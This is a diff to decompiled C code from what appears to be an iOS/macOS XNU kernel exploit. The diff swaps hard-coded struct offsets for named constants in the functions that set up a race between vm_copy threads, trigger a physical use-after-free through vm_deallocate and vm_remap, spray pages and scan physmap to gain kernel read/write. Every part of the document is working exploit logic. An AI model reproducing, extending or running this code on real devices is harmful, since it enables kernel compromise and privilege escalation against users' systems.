@@ -747,6 +747,29 @@ enum
 
 #define KRW_CTX_AT(ctx, type, offset) (*(type *)((char *)(ctx) + (offset)))
 
+enum
+{
+  PHYSMAP_CTX_SPRAY_PAGES_OFFSET = 0x30,
+  PHYSMAP_CTX_SHARED_COPY_BASE_OFFSET = 0x440,
+  PHYSMAP_CTX_REGION_A_LIST_OFFSET = 0x468,
+  PHYSMAP_CTX_REGION_A_INDEX_OFFSET = 0x478,
+  PHYSMAP_CTX_REGION_B_LIST_OFFSET = 0x490,
+  PHYSMAP_CTX_REGION_B_INDEX_OFFSET = 0x4A0,
+  PHYSMAP_CTX_COPY_THREAD_A_OFFSET = 0x4F8,
+  PHYSMAP_CTX_COPY_THREAD_A_READY_OFFSET = 0x500,
+  PHYSMAP_CTX_COPY_THREAD_B_OFFSET = 0x508,
+  PHYSMAP_CTX_COPY_THREAD_B_READY_OFFSET = 0x510,
+  PHYSMAP_CTX_RESTORE_ENTRY_A_OFFSET = 0x4B8,
+  PHYSMAP_CTX_RESTORE_ENTRY_B_OFFSET = 0x4D8,
+  PHYSMAP_CTX_PAGE_WINDOW_COUNT_OFFSET = 0x598,
+  PHYSMAP_CTX_RACE_SOURCE_A_OFFSET = 0x5D8,
+  PHYSMAP_CTX_RACE_SOURCE_B_OFFSET = 0x5E0,
+  PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET = 0x38,
+  PHYSMAP_PAGE_ENTRY_BACKING_OFFSET = 0xA0,
+};
+
+#define PHYSMAP_CTX_AT(ctx, type, offset) (*(type *)((char *)(ctx) + (offset)))
+
 static krw_setup_path_t krw_select_setup_path(struct_krwCtx *krwCtx)
 {
   uint64_t xnuVersionPacked = krwCtx->xnuVersionPacked;
@@ -3213,9 +3236,9 @@ unsigned __int64 __fastcall run_physmap_worker_threads(__int64 a1)
   char v16; // w21
   unsigned __int64 result; // x0
 
-  v2 = (pthread_t *)(a1 + 1272);
-  v3 = (unsigned __int8 *)(a1 + 1280);
-  atomic_store(0, (unsigned __int8 *)(a1 + 1280));
+  v2 = &PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_A_OFFSET);
+  v3 = &PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_A_READY_OFFSET);
+  atomic_store(0, &PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_A_READY_OFFSET));
   v4 = (void *(__cdecl *)(void *))nullsub_1(trigger_vm_copy_shared_mem);
   if ( pthread_create(v2, 0, v4, (void *)a1) )
     __error();
@@ -3225,53 +3248,53 @@ unsigned __int64 __fastcall run_physmap_worker_threads(__int64 a1)
     do
     {
       usleep(0x3E8u);
-      v6 = atomic_load((unsigned __int8 *)(a1 + 1280));
+      v6 = atomic_load(&PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_A_READY_OFFSET));
     }
     while ( (v6 & 1) == 0 );
   }
   usleep(0x1388u);
-  atomic_store(0, (unsigned __int8 *)(a1 + 1296));
+  atomic_store(0, &PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_B_READY_OFFSET));
   v7 = (void *(__cdecl *)(void *))nullsub_1(thread_realtime_vm_copy);
-  if ( pthread_create((pthread_t *)(a1 + 1288), 0, v7, (void *)a1) )
+  if ( pthread_create(&PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_B_OFFSET), 0, v7, (void *)a1) )
     __error();
-  v8 = atomic_load((unsigned __int8 *)(a1 + 1296));
+  v8 = atomic_load(&PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_B_READY_OFFSET));
   if ( (v8 & 1) == 0 )
   {
     do
     {
       usleep(0x3E8u);
-      v9 = atomic_load((unsigned __int8 *)(a1 + 1296));
+      v9 = atomic_load(&PHYSMAP_CTX_AT(a1, unsigned __int8, PHYSMAP_CTX_COPY_THREAD_B_READY_OFFSET));
     }
     while ( (v9 & 1) == 0 );
   }
   usleep(0x1388u);
-  vm_region_nesting_result nesting = query_vm_region_nesting(*(uint64_t *)(a1 + 1088));
+  vm_region_nesting_result nesting = query_vm_region_nesting(PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_SHARED_COPY_BASE_OFFSET));
   v11 = 0;
   v12 = 1;
   while ( 1 )
   {
     v13 = v12;
-    if ( nesting.object_id == *(uint64_t *)(*(uint64_t *)(a1 + 8 * v11 + 1128) + 16LL) )
+    if ( nesting.object_id == *(uint64_t *)(*(uint64_t *)(a1 + 8 * v11 + PHYSMAP_CTX_REGION_A_LIST_OFFSET) + 16LL) )
       break;
     v12 = 0;
     v11 = 1;
     if ( (v13 & 1) == 0 )
       goto LABEL_14;
   }
-  *(uint64_t *)(a1 + 1144) = v11;
+  PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_A_INDEX_OFFSET) = v11;
 LABEL_14:
   v14 = 0;
   for ( i = 1; ; i = 0 )
   {
     v16 = i;
-    result = query_vm_region_nesting(*(uint64_t *)(*(uint64_t *)(a1 + 8 * v14 + 1168) + 56LL)).packed_info;
+    result = query_vm_region_nesting(*(uint64_t *)(*(uint64_t *)(a1 + 8 * v14 + PHYSMAP_CTX_REGION_B_LIST_OFFSET) + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET)).packed_info;
     if ( (uint32_t)result == 2 )
       break;
     v14 = 1;
     if ( (v16 & 1) == 0 )
       return result;
   }
-  *(uint64_t *)(a1 + 1184) = v14;
+  PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_B_INDEX_OFFSET) = v14;
   return result;
 }
 // 8324: variable 'v10' is possibly undefined
@@ -3302,24 +3325,24 @@ __int64 __fastcall puaf_vmregion_race_trigger(uint64_t *a1)
   address = 0;
   vm_allocate(mach_task_self_, &address, 0xC000u, 1);
   v2 = address;
-  v3 = a1[136];
-  v4 = a1[188];
-  *(uint8_t *)(a1[187] + v3) = 65;
+  v3 = PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_SHARED_COPY_BASE_OFFSET);
+  v4 = PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_RACE_SOURCE_B_OFFSET);
+  *(uint8_t *)(PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_RACE_SOURCE_A_OFFSET) + v3) = 65;
   *(uint8_t *)(v4 + v3) = 65;
-  v5 = a1[a1[143] + 141];
-  vm_deallocate(mach_task_self_, *(uint64_t *)(v5 + 56), 0xC000u);
-  *(uint64_t *)(v5 + 56) = 0;
+  v5 = *(uint64_t *)((char *)a1 + PHYSMAP_CTX_REGION_A_LIST_OFFSET + 8 * PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_A_INDEX_OFFSET));
+  vm_deallocate(mach_task_self_, *(uint64_t *)(v5 + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET), 0xC000u);
+  *(uint64_t *)(v5 + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET) = 0;
   thread_switch(0, 2, 0);
-  v6 = a1[a1[148] + 146];
-  vm_deallocate(mach_task_self_, *(uint64_t *)(v6 + 56), 0xC000u);
-  *(uint64_t *)(v6 + 56) = 0;
+  v6 = *(uint64_t *)((char *)a1 + PHYSMAP_CTX_REGION_B_LIST_OFFSET + 8 * PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_B_INDEX_OFFSET));
+  vm_deallocate(mach_task_self_, *(uint64_t *)(v6 + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET), 0xC000u);
+  *(uint64_t *)(v6 + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET) = 0;
   vm_remap_inplace(v2, 0xC000u, 0);
   query_vm_region_nesting(v2);
-  *(uint64_t *)(a1[a1[148] + 146] + 56LL) = v2;
-  scan_physmap_for_region((__int64)a1, a1[179]);
-  physmap_madvise_free((__int64)a1, a1[179] - 4LL);
+  *(uint64_t *)(*(uint64_t *)((char *)a1 + PHYSMAP_CTX_REGION_B_LIST_OFFSET + 8 * PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_REGION_B_INDEX_OFFSET)) + PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET) = v2;
+  scan_physmap_for_region((__int64)a1, PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_PAGE_WINDOW_COUNT_OFFSET));
+  physmap_madvise_free((__int64)a1, PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_PAGE_WINDOW_COUNT_OFFSET) - 4LL);
   for ( i = 0; i != 800000; i += 8 )
-    result = vm_remap_inplace(*(uint64_t *)(a1[6] + i), 0x4000u, 0);
+    result = vm_remap_inplace(*(uint64_t *)(PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_SPRAY_PAGES_OFFSET) + i), 0x4000u, 0);
   return result;
 }
 
@@ -3346,19 +3369,19 @@ uintptr_t __fastcall puaf_vm_region_scan_1(__int64 a1)
     address = v2 + 0x4000;
   }
   vm_allocate(mach_task_self_, &address, 0x4000u, 0x4000);
-  v4 = *(uint64_t *)(a1 + 1240);
-  vm_deallocate(mach_task_self_, *(uint64_t *)(v4 + 160), 0x4000u);
-  *(uint64_t *)(v4 + 160) = 0;
-  if ( pthread_join(*(pthread_t *)(a1 + 1288), 0) )
+  v4 = PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_RESTORE_ENTRY_B_OFFSET);
+  vm_deallocate(mach_task_self_, *(uint64_t *)(v4 + PHYSMAP_PAGE_ENTRY_BACKING_OFFSET), 0x4000u);
+  *(uint64_t *)(v4 + PHYSMAP_PAGE_ENTRY_BACKING_OFFSET) = 0;
+  if ( pthread_join(PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_B_OFFSET), 0) )
     __error();
-  *(uint64_t *)(a1 + 1288) = 0;
-  v5 = *(uint64_t *)(a1 + 1208);
-  vm_deallocate(mach_task_self_, *(uint64_t *)(v5 + 160), 0x4000u);
-  *(uint64_t *)(v5 + 160) = 0;
-  status = pthread_join(*(pthread_t *)(a1 + 1272), 0);
+  PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_B_OFFSET) = 0;
+  v5 = PHYSMAP_CTX_AT(a1, uint64_t, PHYSMAP_CTX_RESTORE_ENTRY_A_OFFSET);
+  vm_deallocate(mach_task_self_, *(uint64_t *)(v5 + PHYSMAP_PAGE_ENTRY_BACKING_OFFSET), 0x4000u);
+  *(uint64_t *)(v5 + PHYSMAP_PAGE_ENTRY_BACKING_OFFSET) = 0;
+  status = pthread_join(PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_A_OFFSET), 0);
   if ( status )
     return (uintptr_t)__error();
-  *(uint64_t *)(a1 + 1272) = 0;
+  PHYSMAP_CTX_AT(a1, pthread_t, PHYSMAP_CTX_COPY_THREAD_A_OFFSET) = 0;
   return 0;
 }
 
